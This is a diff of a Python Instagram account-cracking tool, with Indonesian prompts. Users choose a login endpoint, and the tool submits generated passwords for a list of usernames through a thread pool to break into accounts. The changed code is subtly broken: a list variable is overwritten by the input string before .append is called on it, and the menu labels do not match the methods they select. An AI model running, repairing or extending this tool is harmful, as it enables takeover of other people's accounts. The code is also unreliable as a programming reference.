@@ -485,15 +485,21 @@ def cccrack():
 	
 def crack():
 	print('\n')
+	method = []
 	console.print(Panel(f"""{P2}[{color_text}01{P2}]. Crack Menggunakan Methode i.instagram.com
 {P2}[{color_text}02{P2}]. Crack Menggunakan Methode www.instagram.com
 {P2}[{color_text}03{P2}]. Crack Menggunakan Methode api.instagram.com""",width=60, title="METHOD", style=f"{color_panel}"))
 	method = Console().input(f" {H2}• {P2}Masukan : ")
-	if method in ['01','1']: SistemLog = "api"
-	elif method in ['02','2']: SistemLog = "ini"
-	elif method in ['03','3']: SistemLog = "www"
-	elif method in ['04','4']: SistemLog = "bi"
-	else:SistemLog = "api"
+	if method in ['01','1']: 
+		method.append("api")
+	elif method in ['02','2']: 
+		method.append("ini")
+	elif method in ['03','3']: 
+		method.append("www")
+	elif method in ['04','4']: 
+		method.append("bi")
+	else:
+		method.append("api")
 	apsw()
 
 	
@@ -524,13 +530,13 @@ def apsw():
 			for i in fanids:
 				username, password = i.split('<<=>>')
 				password = generate(password.lower())
-				if SistemLog == "api":
+				if "api" in method:
 					fannjha.submit(api_insta, username, password)
-				elif SistemLog == "ini":
+				elif "ini" in method:
 					fannjha.submit(i_insta, username, password)
-				elif SistemLog == "www":
+				elif "www" in method:
 					fannjha.submit(www_insta, username, password)
-				elif SistemLog == "bi":
+				elif "bi" in method:
 					fannjha.submit(threads, username, password)
 				else:
 					fannjha.submit(api_insta, username, password)
